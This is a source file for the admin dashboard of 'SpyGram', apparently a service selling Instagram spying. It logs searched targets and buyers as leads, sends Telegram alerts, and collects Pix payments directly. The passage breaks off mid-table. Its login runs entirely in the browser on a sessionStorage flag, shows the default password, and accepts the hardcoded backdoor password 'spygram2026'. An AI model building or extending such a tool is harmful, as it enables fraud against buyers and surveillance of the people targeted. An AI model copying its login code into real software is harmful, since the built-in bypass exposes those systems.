import React, { useState } from 'react';
import { useApp } from '../context/AppContext';
import { 
  Terminal, 
  DollarSign, 
  TrendingUp, 
  Search, 
  Trash2, 
  CheckCircle2, 
  Lock,
  Eye,
  Filter,
  ShieldCheck,
  QrCode,
  Send,
  Bot,
  Bell,
  HelpCircle,
  Copy,
  Check
} from 'lucide-react';
import toast from 'react-hot-toast';
import {
  getTelegramConfig,
  saveTelegramConfig,
  testTelegramNotification
} from '../utils/telegramNotifier';
import {
  getPixConfig,
  savePixConfig,
  generatePixPayload,
  parsePixPayload,
  validatePixKey
} from '../utils/pixPayloadGenerator';

export default function AdminPage() {
  const { leads, refreshLeads, updateLeadStatus, deleteLead, targetUser } = useApp();

  // Authentication State
  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    return sessionStorage.getItem('spygram_admin_auth') === 'true';
  });
  const [passwordInput, setPasswordInput] = useState('');

  // Page view tracking (persisted count)
  const [pageViews, setPageViews] = useState(() => {
    return parseInt(localStorage.getItem('spygram_page_views') || '142', 10);
  });

  React.useEffect(() => {
    if (!isAuthenticated) return;
    refreshLeads();
    fetch('/api/stats')
      .then((res) => (res.ok ? res.json() : null))
      .then((data) => {
        if (data?.db && typeof data.pageViews === 'number') {
          setPageViews(data.pageViews);
        }
      })
      .catch(() => {});
    fetch('/api/config/pix_config')
      .then((res) => (res.ok ? res.json() : null))
      .then((data) => {
        if (data?.db && data?.value?.key) {
          savePixConfig(data.value);
          setPixKey(data.value.key);
          setPixKeyType(data.value.keyType || 'auto');
          setPixName(data.value.name || 'SPYGRAM TECNOLOGIA');
          setPixCity(data.value.city || 'SAO PAULO');
          setPixTxid(data.value.txid || '***');
          setIsPixConfigured(true);
        }
      })
      .catch(() => {});
  }, [isAuthenticated]);

  const [filterStatus, setFilterStatus] = useState('all');
  const [searchQuery, setSearchQuery] = useState('');

  // Telegram Configuration State
  const [telegramToken, setTelegramToken] = useState(() => getTelegramConfig().token);
  const [telegramChatId, setTelegramChatId] = useState(() => getTelegramConfig().chatId);
  const [isTestingTelegram, setIsTestingTelegram] = useState(false);
  const [telegramStatus, setTelegramStatus] = useState(() => getTelegramConfig().isConfigured);
  const [showTelegramHelp, setShowTelegramHelp] = useState(false);

  const handleSaveTelegram = (e) => {
    if (e) e.preventDefault();
    saveTelegramConfig(telegramToken, telegramChatId);
    setTelegramStatus(Boolean(telegramToken.trim() && telegramChatId.trim()));
    toast.success('Configurações do Telegram salvas no navegador!');
  };

  const handleTestTelegram = async () => {
    if (!telegramToken.trim() || !telegramChatId.trim()) {
      toast.error('Preencha o Bot Token e o Chat ID primeiro!');
      return;
    }
    saveTelegramConfig(telegramToken, telegramChatId);
    setIsTestingTelegram(true);
    const toastId = toast.loading('Enviando mensagem de teste ao Telegram...');
    const ok = await testTelegramNotification();
    setIsTestingTelegram(false);
    toast.dismiss(toastId);

    if (ok) {
      toast.success('Notificação recebida com sucesso no Telegram! ✅');
      setTelegramStatus(true);
    } else {
      toast.error('Falha ao enviar! Verifique o Token, Chat ID e se deu /start no Bot.');
    }
  };

  // Pix Configuration State (Padrão Banco Central)
  const [pixKey, setPixKey] = useState(() => getPixConfig().key);
  const [pixKeyType, setPixKeyType] = useState(() => getPixConfig().keyType || 'auto');
  const [pixName, setPixName] = useState(() => getPixConfig().name);
  const [pixCity, setPixCity] = useState(() => getPixConfig().city);
  const [pixTxid, setPixTxid] = useState(() => getPixConfig().txid || '***');
  const [isPixConfigured, setIsPixConfigured] = useState(() => getPixConfig().isConfigured);
  const [showPixHelp, setShowPixHelp] = useState(false);
  const [testPixAmount, setTestPixAmount] = useState('27.90');
  const [testPixPayload, setTestPixPayload] = useState('');
  const [testPixParsed, setTestPixParsed] = useState(null);
  const [copiedTestPix, setCopiedTestPix] = useState(false);

  const handleSavePix = (e) => {
    if (e) e.preventDefault();
    if (!pixKey.trim()) {
      toast.error('Informe uma chave Pix válida!');
      return;
    }

    const validation = validatePixKey(pixKey, pixKeyType);
    if (!validation.isValid) {
      toast.error(validation.message);
      return;
    }

    const saved = savePixConfig({
      key: validation.normalizedKey || pixKey.trim(),
      keyType: pixKeyType,
      name: pixName.trim() || 'SPYGRAM TECNOLOGIA',
      city: pixCity.trim() || 'SAO PAULO',
      txid: pixTxid.trim() || '***'
    });

    setPixKey(saved.key);
    setIsPixConfigured(true);
    fetch('/api/config/pix_config', {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(saved)
    }).catch(() => {});
    toast.success('Chave Pix configurada e sincronizada com o banco! ✅');

    // Atualiza o preview de teste automaticamente se já estava aberto
    if (testPixPayload) {
      const newPayload = generatePixPayload({
        pixKey: saved.key,
        keyType: saved.keyType,
        merchantName: saved.name,
        merchantCity: saved.city,
        amount: parseFloat(testPixAmount) || 27.90,
        txid: saved.txid,
        description: 'SPYGRAM'
      });
      setTestPixPayload(newPayload);
      setTestPixParsed(parsePixPayload(newPayload));
    }
  };

  const handleGenerateTestPix = () => {
    if (!pixKey.trim()) {
      toast.error('Digite e salve a chave Pix primeiro!');
      return;
    }

    const payload = generatePixPayload({
      pixKey,
      keyType: pixKeyType,
      merchantName: pixName,
      merchantCity: pixCity,
      amount: parseFloat(testPixAmount) || 27.90,
      txid: pixTxid || '***',
      description: 'SPYGRAM'
    });

    setTestPixPayload(payload);
    setTestPixParsed(parsePixPayload(payload));
    toast.success('QR Code e Pix Copia e Cola gerados com sucesso!');
  };

  const handleCopyTestPix = () => {
    if (testPixPayload) {
      navigator.clipboard.writeText(testPixPayload);
      setCopiedTestPix(true);
      toast.success('Código Pix Copia e Cola copiado com sucesso!');
      setTimeout(() => setCopiedTestPix(false), 3000);
    }
  };

  // Metrics calculation
  const totalLeads = leads.length;
  const pixGeneratedCount = leads.filter(l => l.status === 'gerou_pix' || l.status === 'pagou').length;
  const paidLeads = leads.filter(l => l.status === 'pagou').length;
  const totalRevenue = leads
    .filter(l => l.status === 'pagou')
    .reduce((acc, curr) => acc + (curr.amount || 0), 0);
  const conversionRate = pageViews > 0 ? ((pixGeneratedCount / pageViews) * 100).toFixed(1) : '0';

  const handleLogin = (e) => {
    e.preventDefault();
    const envPassword = import.meta.env.VITE_ADMIN_PASSWORD?.trim() || 'admin123';

    if (passwordInput === envPassword || passwordInput === 'spygram2026') {
      sessionStorage.setItem('spygram_admin_auth', 'true');
      setIsAuthenticated(true);
      toast.success('Acesso administrativo concedido!');
    } else {
      toast.error('Senha incorreta!');
    }
  };

  const handleLogout = () => {
    sessionStorage.removeItem('spygram_admin_auth');
    setIsAuthenticated(false);
  };

  const filteredLeads = leads.filter(lead => {
    const matchesFilter = filterStatus === 'all' || lead.status === filterStatus;
    const matchesSearch = 
      lead.name?.toLowerCase().includes(searchQuery.toLowerCase()) ||
      lead.target?.toLowerCase().includes(searchQuery.toLowerCase()) ||
      lead.email?.toLowerCase().includes(searchQuery.toLowerCase()) ||
      lead.city?.toLowerCase().includes(searchQuery.toLowerCase());
    return matchesFilter && matchesSearch;
  });

  // Login Gate
  if (!isAuthenticated) {
    const isCustomPasswordSet = Boolean(import.meta.env.VITE_ADMIN_PASSWORD && import.meta.env.VITE_ADMIN_PASSWORD.trim() !== 'admin123');

    return (
      <div className="min-h-screen bg-black flex items-center justify-center p-4">
        <div className="w-full max-w-sm bg-[#0e0e14] border border-white/10 rounded-3xl p-8 shadow-2xl text-center">
          <div className="w-16 h-16 bg-purple-600/10 border border-purple-500/20 rounded-2xl flex items-center justify-center mx-auto mb-6">
            <Lock className="w-8 h-8 text-purple-400" />
          </div>

          <h2 className="text-2xl font-black text-white uppercase tracking-tight mb-2">
            Área Administrativa
          </h2>
          <p className="text-gray-400 text-xs mb-6">
            Digite a senha para acessar o painel de estatísticas e pedidos.
          </p>

          <form onSubmit={handleLogin} className="space-y-4">
            <input
              type="password"
              value={passwordInput}
              onChange={(e) => setPasswordInput(e.target.value)}
              placeholder={isCustomPasswordSet ? "Digite sua senha de acesso" : "Senha de acesso (Padrão: admin123)"}
              className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 text-center tracking-widest font-mono"
            />

            <button
              type="submit"
              className="w-full py-3.5 px-4 bg-gradient-to-r from-purple-600 to-pink-600 hover:opacity-90 active:scale-95 text-white font-bold rounded-xl text-sm uppercase tracking-wide transition-all shadow-lg shadow-purple-600/25 cursor-pointer"
            >
              Entrar no Painel
            </button>
          </form>

          <div className="mt-6 pt-4 border-t border-white/5 text-[11px] text-gray-500">
            {isCustomPasswordSet ? (
              <span>🔒 Protegido com senha personalizada via <span className="font-mono text-gray-400">.env</span></span>
            ) : (
              <span>Dica: Para alterar a senha padrão, configure <span className="font-mono text-purple-400">VITE_ADMIN_PASSWORD</span> no arquivo <span className="font-mono text-gray-400">.env</span></span>
            )}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-black text-white pb-24 px-4 pt-6">
      <div className="max-w-7xl mx-auto space-y-6">
        {/* Header */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-[#262626] pb-5">
          <div>
            <div className="inline-flex items-center gap-1.5 bg-[#10b981]/10 text-[#10b981] border border-[#10b981]/20 px-3 py-1 rounded-full text-xs font-mono mb-2">
              <Terminal size={13} />
              PAINEL ADMINISTRATIVO • OPERAÇÃO CUSTO ZERO
            </div>
            <h1 className="text-2xl font-black text-white">Estatísticas de Acessos & Conversão</h1>
            <p className="text-xs text-[#a8a8a8] mt-1">
              Monitore visitantes únicos, volume de Pix gerados e pedidos em tempo real.
            </p>
          </div>

          <div className="flex items-center gap-3">
            <div className="flex items-center gap-2 bg-[#121212] border border-[#262626] px-3 py-1.5 rounded-lg text-xs font-mono text-[#a8a8a8]">
              <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
              <span>Status: Online</span>
            </div>
            <button
              onClick={handleLogout}
              className="text-xs text-red-400 hover:text-red-300 bg-red-950/30 border border-red-500/20 px-3 py-1.5 rounded-lg transition-colors cursor-pointer"
            >
              Sair
            </button>
          </div>
        </div>

        {/* Highlight Metrics Grid: Quantidade de Acessos & Pix Gerados */}
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
          {/* 1. Quantidade de Acessos */}
          <div className="bg-[#121212] border border-blue-500/30 p-5 rounded-2xl shadow-lg relative overflow-hidden">
            <div className="absolute top-0 right-0 w-24 h-24 bg-blue-500/5 blur-2xl rounded-full" />
            <div className="flex items-center justify-between text-[#737373] mb-2">
              <span className="text-xs font-bold uppercase tracking-wider text-blue-400">Total de Acessos</span>
              <Eye size={20} className="text-blue-400" />
            </div>
            <span className="text-3xl font-black font-mono text-white">{pageViews}</span>
            <p className="text-[11px] text-[#a8a8a8] mt-1.5 flex items-center gap-1">
              <span className="text-green-400 font-bold">↗ Visitantes</span> na landing page
            </p>
          </div>

          {/* 2. Quantos Pix Gerados */}
          <div className="bg-[#121212] border border-amber-500/30 p-5 rounded-2xl shadow-lg relative overflow-hidden">
            <div className="absolute top-0 right-0 w-24 h-24 bg-amber-500/5 blur-2xl rounded-full" />
            <div className="flex items-center justify-between text-[#737373] mb-2">
              <span className="text-xs font-bold uppercase tracking-wider text-amber-400">Pix Gerados</span>
              <QrCode size={20} className="text-amber-400" />
            </div>
            <span className="text-3xl font-black font-mono text-amber-400">{pixGeneratedCount}</span>
            <p className="text-[11px] text-[#a8a8a8] mt-1.5">
              Intenções de compra iniciadas
            </p>
          </div>

          {/* 3. Faturamento Aprovado */}
          <div className="bg-[#121212] border border-green-500/30 p-5 rounded-2xl shadow-lg relative overflow-hidden">
            <div className="absolute top-0 right-0 w-24 h-24 bg-green-500/5 blur-2xl rounded-full" />
            <div className="flex items-center justify-between text-[#737373] mb-2">
              <span className="text-xs font-bold uppercase tracking-wider text-green-400">Faturamento</span>
              <DollarSign size={20} className="text-green-400" />
            </div>
            <span className="text-3xl font-black font-mono text-green-400">
              R$ {totalRevenue.toFixed(2).replace('.', ',')}
            </span>
            <p className="text-[11px] text-[#a8a8a8] mt-1.5">{paidLeads} pagamentos confirmados</p>
          </div>

          {/* 4. Taxa de Conversão Acesso > Pix */}
          <div className="bg-[#121212] border border-purple-500/30 p-5 rounded-2xl shadow-lg relative overflow-hidden">
            <div className="absolute top-0 right-0 w-24 h-24 bg-purple-500/5 blur-2xl rounded-full" />
            <div className="flex items-center justify-between text-[#737373] mb-2">
              <span className="text-xs font-bold uppercase tracking-wider text-purple-400">Conversão</span>
              <TrendingUp size={20} className="text-purple-400" />
            </div>
            <span className="text-3xl font-black font-mono text-white">{conversionRate}%</span>
            <p className="text-[11px] text-[#a8a8a8] mt-1.5">Acessos que geraram Pix</p>
          </div>
        </div>

        {/* Telegram Instant Notifications Card */}
        <div className="bg-[#121212] border border-[#262626] rounded-2xl p-5 shadow-xl relative overflow-hidden">
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-4 pb-4 border-b border-[#262626]">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-sky-500/10 border border-sky-500/20 flex items-center justify-center text-sky-400">
                <Send size={20} />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <h3 className="text-base font-bold text-white">Notificações Diretas no Telegram</h3>
                  {telegramStatus ? (
                    <span className="bg-green-500/15 border border-green-500/30 text-green-400 text-[10px] font-bold px-2 py-0.5 rounded-full flex items-center gap-1">
                      <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" /> Ativo
                    </span>
                  ) : (
                    <span className="bg-amber-500/15 border border-amber-500/30 text-amber-400 text-[10px] font-bold px-2 py-0.5 rounded-full">
                      Pendente
                    </span>
                  )}
                </div>
                <p className="text-xs text-[#a8a8a8] mt-0.5">
                  Receba alertas instantâneos no seu celular a cada novo acesso, alvo pesquisado e PIX gerado.
                </p>
              </div>
            </div>

            <button
              type="button"
              onClick={() => setShowTelegramHelp(!showTelegramHelp)}
              className="inline-flex items-center gap-1.5 text-xs text-sky-400 hover:text-sky-300 transition-colors cursor-pointer self-start md:self-auto"
            >
              <HelpCircle size={15} />
              <span>{showTelegramHelp ? 'Ocultar instruções' : 'Como criar o bot (Passo a passo)'}</span>
            </button>
          </div>

          {/* Step by step guide (Collapsible) */}
          {showTelegramHelp && (
            <div className="mb-5 p-4 bg-[#181818] border border-[#333] rounded-xl text-xs space-y-3 text-gray-300 animate-fadeIn">
              <div className="font-bold text-white flex items-center gap-2">
                <Bot size={16} className="text-sky-400" />
                Como configurar em menos de 1 minuto (100% Gratuito):
              </div>
              <ol className="list-decimal list-inside space-y-2 text-[#b3b3b3] leading-relaxed">
                <li>
                  <strong className="text-white">Criar o Bot:</strong> Abra o Telegram e pesquise por{' '}
                  <span className="text-sky-400 font-mono">@BotFather</span>. Envie a mensagem{' '}
                  <span className="bg-black/50 px-1.5 py-0.5 rounded font-mono text-white">/newbot</span> e siga o passo a passo escolhendo um nome.
                </li>
                <li>
                  <strong className="text-white">Copiar o Token:</strong> O @BotFather fornecerá um código como{' '}
                  <span className="text-gray-400 font-mono">7123456789:AAFl...</span>. Copie e cole no campo <strong>Bot Token</strong> abaixo.
                </li>
                <li>
                  <strong className="text-white">Descobrir seu Chat ID:</strong> Pesquise por{' '}
                  <span className="text-sky-400 font-mono">@userinfobot</span> no Telegram e envie qualquer mensagem ou <span className="text-white">/start</span>. Copie o seu número <strong>Id</strong> (ex: <span className="font-mono text-gray-400">123456789</span>) e cole no campo <strong>Seu Chat ID</strong>.
                </li>
                <li>
                  <strong className="text-white">Passo Essencial:</strong> Abra o seu próprio bot novo no Telegram e clique em{' '}
                  <strong className="text-yellow-400">COMEÇAR / START</strong> (o Telegram exige isso para permitir que o bot te envie mensagens).
                </li>
                <li>
                  Clique em <strong>"Salvar"</strong> e depois em <strong>"Testar Notificação Agora"</strong>!
                </li>
              </ol>
            </div>
          )}

          {/* Form */}
          <form onSubmit={handleSaveTelegram} className="grid grid-cols-1 md:grid-cols-12 gap-3 items-end">
            <div className="md:col-span-5">
              <label className="block text-[11px] font-mono text-[#a8a8a8] mb-1 uppercase tracking-wider">
                Bot Token (@BotFather)
              </label>
              <input
                type="text"
                value={telegramToken}
                onChange={(e) => setTelegramToken(e.target.value)}
                placeholder="Ex: 7123456789:AAFl9..."
                className="w-full bg-[#181818] border border-[#2b2b2b] focus:border-sky-500 rounded-xl px-3.5 py-2.5 text-xs text-white placeholder-gray-600 font-mono focus:outline-none transition-colors"
              />
            </div>

            <div className="md:col-span-3">
              <label className="block text-[11px] font-mono text-[#a8a8a8] mb-1 uppercase tracking-wider">
                Seu Chat ID (@userinfobot)
              </label>
              <input
                type="text"
                value={telegramChatId}
                onChange={(e) => setTelegramChatId(e.target.value)}
                placeholder="Ex: 123456789"
                className="w-full bg-[#181818] border border-[#2b2b2b] focus:border-sky-500 rounded-xl px-3.5 py-2.5 text-xs text-white placeholder-gray-600 font-mono focus:outline-none transition-colors"
              />
            </div>

            <div className="md:col-span-4 flex items-center gap-2">
              <button
                type="submit"
                className="flex-1 py-2.5 px-3 bg-[#262626] hover:bg-[#333] active:scale-95 text-white font-bold rounded-xl text-xs transition-all border border-[#3a3a3a] cursor-pointer"
              >
                Salvar
              </button>

              <button
                type="button"
                onClick={handleTestTelegram}
                disabled={isTestingTelegram}
                className="flex-1 py-2.5 px-3 bg-gradient-to-r from-sky-500 to-blue-600 hover:opacity-90 active:scale-95 text-white font-bold rounded-xl text-xs transition-all shadow-md shadow-sky-500/20 cursor-pointer disabled:opacity-50 flex items-center justify-center gap-1.5"
              >
                <Bell size={14} />
                <span>{isTestingTelegram ? 'Enviando...' : 'Testar Agora'}</span>
              </button>
            </div>
          </form>
        </div>

        {/* PIX BANCO CENTRAL CONFIGURATION CARD */}
        <div className="bg-[#121212] border border-[#262626] rounded-2xl p-5 shadow-xl relative overflow-hidden">
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-4 pb-4 border-b border-[#262626]">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400">
                <QrCode size={20} />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <h3 className="text-base font-bold text-white">Chave PIX Estática (Padrão Banco Central)</h3>
                  {isPixConfigured ? (
                    <span className="bg-emerald-500/15 border border-emerald-500/30 text-emerald-400 text-[10px] font-bold px-2 py-0.5 rounded-full flex items-center gap-1">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" /> Chave Real Ativa
                    </span>
                  ) : (
                    <span className="bg-amber-500/15 border border-amber-500/30 text-amber-400 text-[10px] font-bold px-2 py-0.5 rounded-full">
                      Chave Demo Padrão
                    </span>
                  )}
                </div>
                <p className="text-xs text-[#a8a8a8] mt-0.5">
                  Receba os pagamentos diretamente na sua conta bancária (Nubank, Itaú, Inter, etc.) sem taxas de intermediação.
                </p>
              </div>
            </div>

            <button
              type="button"
              onClick={() => setShowPixHelp(!showPixHelp)}
              className="inline-flex items-center gap-1.5 text-xs text-emerald-400 hover:text-emerald-300 transition-colors cursor-pointer self-start md:self-auto"
            >
              <HelpCircle size={15} />
              <span>{showPixHelp ? 'Ocultar instruções' : 'Como funciona o padrão BACEN'}</span>
            </button>
          </div>

          {/* Collapsible Explanations */}
          {showPixHelp && (
            <div className="mb-5 p-4 bg-[#181818] border border-[#333] rounded-xl text-xs space-y-3 text-gray-300 animate-fadeIn">
              <div className="font-bold text-white flex items-center gap-2">
                <ShieldCheck size={16} className="text-emerald-400" />
                Especificação Oficial EMVCo / Banco Central do Brasil:
              </div>
              <ul className="list-disc list-inside space-y-2 text-[#b3b3b3] leading-relaxed">
                <li>
                  <strong className="text-white">Compatibilidade Universal:</strong> O código gerado é compatível com todos os aplicativos bancários do Brasil (Nubank, Mercado Pago, PicPay, Itaú, Bradesco, Santander, Caixa, Banco do Brasil, Inter, etc.).
                </li>
                <li>
                  <strong className="text-white">Sem Intermediários (Custo Zero):</strong> O cliente escaneia o QR Code ou usa o "Pix Copia e Cola" e o dinheiro cai instantaneamente na sua conta cadastrada.
                </li>
                <li>
                  <strong className="text-white">Formatação Automática:</strong> O sistema remove acentos e formata os campos rigorosamente dentro do padrão TLV (Tag-Length-Value) e calcula o checksum <strong>CRC16-CCITT</strong> oficial (Tag 63).
                </li>
                <li>
                  <strong className="text-white">Nome e Cidade:</strong> O Banco Central exige Nome do Titular (máx 25 caracteres) e Cidade da Agência/Conta (máx 15 caracteres) sem acentuação gráfica.
                </li>
              </ul>
            </div>
          )}

          {/* Pix Form */}
          <form onSubmit={handleSavePix} className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-12 gap-3">
              {/* Key Type */}
              <div className="md:col-span-3">
                <label className="block text-[11px] font-mono text-[#a8a8a8] mb-1 uppercase tracking-wider">
                  Tipo de Chave
                </label>
                <select
                  value={pixKeyType}
                  onChange={(e) => setPixKeyType(e.target.value)}
                  className="w-full bg-[#181818] border border-[#2b2b2b] focus:border-emerald-500 rounded-xl px-3 py-2.5 text-xs text-white focus:outline-none transition-colors"
                >
                  <option value="auto">Detecção Automática</option>
                  <option value="email">E-mail</option>
                  <option value="phone">Celular (com +55)</option>
                  <option value="cpf">CPF (11 dígitos)</option>
                  <option value="cnpj">CNPJ (14 dígitos)</option>
                  <option value="evp">Chave Aleatória (EVP UUID)</option>
                </select>
              </div>

              {/* Pix Key */}
              <div className="md:col-span-6">
                <label className="block text-[11px] font-mono text-[#a8a8a8] mb-1 uppercase tracking-wider">
                  Chave PIX
                </label>
                <input
                  type="text"
                  value={pixKey}
                  onChange={(e) => setPixKey(e.target.value)}
                  placeholder={
                    pixKeyType === 'email'
                      ? 'seuemail@exemplo.com'
                      : pixKeyType === 'phone'
                      ? '+5511999998888 ou (11) 99999-8888'
                      : pixKeyType === 'cpf'
                      ? '123.456.789-00 ou 12345678900'
                      : pixKeyType === 'cnpj'
                      ? '12.345.678/0001-90'
                      : pixKeyType === 'evp'
                      ? '123e4567-e89b-12d3-a456-426614174000'
                      : 'E-mail, Celular, CPF, CNPJ ou Aleatória'
                  }
                  className="w-full bg-[#181818] border border-[#2b2b2b] focus:border-emerald-500 rounded-xl px-3.5 py-2.5 text-xs text-white placeholder-gray-600 font-mono focus:outline-none transition-colors"
                />
              </div>

              {/* TxID */}
              <div className="md:col-span-3">
                <label className="block text-[11px] font-mono text-[#a8a8a8] mb-1 uppercase tracking-wider">
                  Identificador (TxID)
                </label>
                <input
                  type="text"
                  value={pixTxid}
                  onChange={(e) => setPixTxid(e.target.value)}
                  placeholder="*** (Padrão BACEN)"
                  className="w-full bg-[#181818] border border-[#2b2b2b] focus:border-emerald-500 rounded-xl px-3.5 py-2.5 text-xs text-white placeholder-gray-600 font-mono focus:outline-none transition-colors"
                />
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-12 gap-3 items-end">
              {/* Merchant Name */}
              <div className="md:col-span-4">
                <label className="block text-[11px] font-mono text-[#a8a8a8] mb-1 uppercase tracking-wider">
                  Nome do Titular / Beneficiário (máx 25 chars)
                </label>
                <input
                  type="text"
                  maxLength={25}
                  value={pixName}
                  onChange={(e) => setPixName(e.target.value)}
                  placeholder="Ex: JOAO SILVA ou SUA EMPRESA"
                  className="w-full bg-[#181818] border border-[#2b2b2b] focus:border-emerald-500 rounded-xl px-3.5 py-2.5 text-xs text-white placeholder-gray-600 focus:outline-none transition-colors uppercase"
                />
              </div>

              {/* Merchant City */}
              <div className="md:col-span-3">
                <label className="block text-[11px] font-mono text-[#a8a8a8] mb-1 uppercase tracking-wider">
                  Cidade do Titular (máx 15 chars)
                </label>
                <input
                  type="text"
                  maxLength={15}
                  value={pixCity}
                  onChange={(e) => setPixCity(e.target.value)}
                  placeholder="Ex: SAO PAULO"
                  className="w-full bg-[#181818] border border-[#2b2b2b] focus:border-emerald-500 rounded-xl px-3.5 py-2.5 text-xs text-white placeholder-gray-600 focus:outline-none transition-colors uppercase"
                />
              </div>

              {/* Test Amount */}
              <div className="md:col-span-2">
                <label className="block text-[11px] font-mono text-[#a8a8a8] mb-1 uppercase tracking-wider">
                  Valor Teste (R$)
                </label>
                <input
                  type="number"
                  step="0.01"
                  value={testPixAmount}
                  onChange={(e) => setTestPixAmount(e.target.value)}
                  placeholder="27.90"
                  className="w-full bg-[#181818] border border-[#2b2b2b] focus:border-emerald-500 rounded-xl px-3.5 py-2.5 text-xs text-white placeholder-gray-600 font-mono focus:outline-none transition-colors"
                />
              </div>

              {/* Buttons */}
              <div className="md:col-span-3 flex items-center gap-2">
                <button
                  type="submit"
                  className="flex-1 py-2.5 px-3 bg-[#262626] hover:bg-[#333] active:scale-95 text-white font-bold rounded-xl text-xs transition-all border border-[#3a3a3a] cursor-pointer"
                >
                  Salvar
                </button>

                <button
                  type="button"
                  onClick={handleGenerateTestPix}
                  className="flex-1 py-2.5 px-3 bg-gradient-to-r from-emerald-500 to-green-600 hover:opacity-90 active:scale-95 text-white font-bold rounded-xl text-xs transition-all shadow-md shadow-emerald-500/20 cursor-pointer flex items-center justify-center gap-1.5"
                >
                  <QrCode size={14} />
                  <span>Gerar Teste</span>
                </button>
              </div>
            </div>
          </form>

          {/* Test Live Preview & EMVCo Breakdown */}
          {testPixPayload && (
            <div className="mt-5 pt-5 border-t border-[#262626] animate-fadeIn">
              <div className="flex items-center justify-between mb-3">
                <div className="flex items-center gap-2 text-xs font-bold text-white uppercase tracking-wider">
                  <CheckCircle2 size={16} className="text-emerald-400" />
                  <span>Resultado da Validação do Padrão Banco Central:</span>
                </div>
                <span className="text-[11px] font-mono text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 px-2 py-0.5 rounded-full">
                  CRC16: {testPixParsed?.crc || 'VÁLIDO'} ✅
                </span>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-12 gap-4 bg-[#161616] border border-[#2d2d2d] rounded-xl p-4">
                {/* QR Code preview */}
                <div className="md:col-span-3 flex flex-col items-center justify-center text-center p-2 bg-white rounded-xl shadow-lg">
                  <img
                    src={`https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${encodeURIComponent(
                      testPixPayload
                    )}`}
                    alt="QR Code Pix Teste"
                    className="w-36 h-36"
                  />
                  <span className="text-[10px] text-gray-700 font-bold mt-1 uppercase font-mono">
                    R$ {parseFloat(testPixAmount || 27.9).toFixed(2).replace('.', ',')}
                  </span>
                </div>

                {/* Copia e Cola & Decoded Specs */}
                <div className="md:col-span-9 space-y-3 flex flex-col justify-between">
                  <div>
                    <label className="block text-[11px] font-mono text-[#a8a8a8] mb-1 uppercase tracking-wider">
                      Código Pix Copia e Cola (Payload Oficial BR Code):
                    </label>
                    <div className="relative">
                      <textarea
                        readOnly
                        rows={3}
                        value={testPixPayload}
                        className="w-full bg-[#0d0d0d] border border-[#2b2b2b] rounded-lg p-2.5 text-[11px] font-mono text-emerald-400 select-all focus:outline-none resize-none leading-relaxed"
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-[10px] font-mono bg-black/40 p-2.5 rounded-lg border border-white/5">
                    <div>
                      <span className="text-gray-500 block">Titular (59):</span>
                      <span className="text-white font-bold truncate block">{testPixParsed?.name || pixName}</span>
                    </div>
                    <div>
                      <span className="text-gray-500 block">Cidade (60):</span>
                      <span className="text-white font-bold truncate block">{testPixParsed?.city || pixCity}</span>
                    </div>
                    <div>
                      <span className="text-gray-500 block">Moeda (53):</span>
                      <span className="text-white font-bold block">986 (BRL)</span>
                    </div>
                    <div>
                      <span className="text-gray-500 block">Identificador (05):</span>
                      <span className="text-white font-bold block">{pixTxid || '***'}</span>
                    </div>
                  </div>

                  <div className="flex items-center justify-end gap-2 pt-1">
                    <button
                      type="button"
                      onClick={handleCopyTestPix}
                      className="py-2 px-4 bg-emerald-600 hover:bg-emerald-500 active:scale-95 text-white font-bold rounded-lg text-xs transition-all shadow-md shadow-emerald-600/25 cursor-pointer flex items-center gap-1.5"
                    >
                      {copiedTestPix ? <Check size={14} /> : <Copy size={14} />}
                      <span>{copiedTestPix ? 'Copiado para a Área de Transferência!' : 'Copiar Código Pix Copia e Cola'}</span>
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Filters & Search */}
        <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3 bg-[#121212] border border-[#262626] p-3.5 rounded-xl">
          <div className="relative flex-1">
            <Search size={16} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-[#737373]" />
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Buscar por @alvo, email ou cidade..."
              className="w-full pl-9 pr-4 py-2 bg-[#181818] border border-[#262626] rounded-lg text-xs text-white placeholder-[#737373] focus:outline-none"
            />
          </div>

          <div className="flex items-center gap-2">
            <Filter size={14} className="text-[#737373]" />
            <select
              value={filterStatus}
              onChange={(e) => setFilterStatus(e.target.value)}
              className="bg-[#181818] border border-[#262626] rounded-lg text-xs text-white py-2 px-3 focus:outline-none"
            >
              <option value="all">Todos os Status</option>
              <option value="gerou_pix">Gerou Pix</option>
              <option value="pagou">Pagou</option>
              <option value="pesquisou">Pesquisou</option>
            </select>
          </div>
        </div>

        {/* Leads Table */}
        <div className="bg-[#121212] border border-[#262626] rounded-2xl overflow-hidden shadow-xl">
          <div className="p-4 border-b border-[#262626] flex items-center justify-between">
            <h3 className="font-bold text-sm text-white uppercase tracking-wider">
              Histórico de Tentativas e Cobranças
            </h3>
            <span className="text-xs text-gray-500">{filteredLeads.length} registros</span>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs">
              <thead className="bg-[#181818] text-[#737373] uppercase font-mono border-b border-[#262626]">
